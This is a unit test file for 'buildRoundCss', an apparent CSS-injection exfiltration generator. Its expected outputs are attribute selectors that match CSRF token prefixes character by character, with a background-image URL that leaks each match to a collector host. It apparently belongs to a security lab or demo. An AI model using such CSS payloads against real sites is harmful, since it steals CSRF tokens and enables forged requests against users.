import { describe, it, expect } from "vitest";
import { buildRoundCss } from "../src/css.js";

describe("buildRoundCss", () => {
  const css = buildRoundCss({
    phase: "vuln",
    pos: 2,
    prefix: "a1",
    alphabet: "0ab",
    collectorUrl: "http://collector:4000",
  });

  it("emits one rule per candidate character", () => {
    expect(css.split("\n")).toHaveLength(3);
  });

  it("selects on the known prefix plus each candidate", () => {
    expect(css).toContain('input[name="csrf"][value^="a10"]');
    expect(css).toContain('input[name="csrf"][value^="a1a"]');
    expect(css).toContain('input[name="csrf"][value^="a1b"]');
  });

  it("encodes phase, position and character in the leak URL", () => {
    expect(css).toContain(
      "background-image:url(http://collector:4000/leak?phase=vuln&pos=2&c=b&n=2-b)",
    );
  });
});
